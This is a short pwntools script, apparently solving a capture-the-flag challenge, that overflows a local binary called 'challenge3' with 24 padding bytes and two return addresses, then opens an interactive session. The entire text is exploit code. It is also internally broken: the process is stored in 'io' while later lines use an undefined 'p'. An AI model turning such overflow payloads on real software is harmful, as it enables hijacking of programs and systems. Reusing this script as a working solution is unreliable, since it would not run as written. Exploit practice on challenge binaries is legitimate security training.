from pwn import *
io = process('./challenge3')
payload = b'A'*24+p64(0x0000000000401156)+p64(0x401210)
p.sendline(payload)
p.interactive()
